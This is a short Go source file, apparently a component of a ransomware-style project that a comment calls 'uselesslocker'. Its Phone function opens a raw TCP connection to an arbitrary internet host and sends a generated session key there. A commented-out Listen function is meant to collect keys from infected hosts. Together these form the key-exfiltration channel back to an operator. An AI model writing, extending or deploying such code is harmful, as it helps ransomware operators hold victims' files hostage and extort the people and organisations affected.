// Package home contains useful functions for sending and receiving
// session keys.
package home

import (
	"net"
)

// Phone makes a connection to a host somewhere on the internet, once connceted
// the generated session key is then transmitted.
func Phone(address string, key []byte) (err error) {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return
	}
	defer conn.Close()

	// Send the session key over the raw socket.
	_, err = conn.Write([]byte(key))
	return
}

// Listen attempts to listen for incomming connections from uselesslocker
// hosts and store any received session keys.
/*func Listen(laddr string) (err error) {
	l, err := net.Listen("tcp", laddr)
	if err != nil {
		return
	}
	defer l.Close()

	for {
		conn, err := l.Accept()
		if err != nil {
			return
		}

	}
	return
}*/
